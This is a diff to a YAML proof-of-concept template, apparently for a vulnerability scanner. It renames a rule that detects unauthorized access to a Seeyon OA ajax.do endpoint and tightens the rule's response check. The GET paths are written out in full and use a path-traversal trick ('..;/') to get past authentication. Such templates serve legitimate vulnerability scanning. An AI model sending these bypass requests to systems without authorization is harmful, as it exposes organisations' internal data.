@@ -1,4 +1,4 @@
-name: poc-yaml-seeyon-unauthorized
+name: poc-yaml-seeyon-ajax-unauthorized-access
 rules:
   - method: GET
     path: /seeyon/thirdpartyController.do.css/..;/ajax.do
@@ -7,7 +7,7 @@ rules:
   - method: GET
     path: /seeyon/personalBind.do.jpg/..;/ajax.do?method=ajaxAction&managerName=mMOneProfileManager&managerMethod=getOAProfile
     expression: |
-      response.status == 200 && response.body.bcontains(bytes("MMOneProfile")) && response.body.bcontains(bytes("productTags")) && response.body.bcontains(bytes("serverIdentifier"))
+      response.status == 200 && response.body.bcontains(bytes("MMOneProfile")) && response.body.bcontains(bytes("productTags")) && response.body.bcontains(bytes("serverIdentifier")) && response.content_type.contains("application/json")
 
 detail:
   author: x1n9Qi8
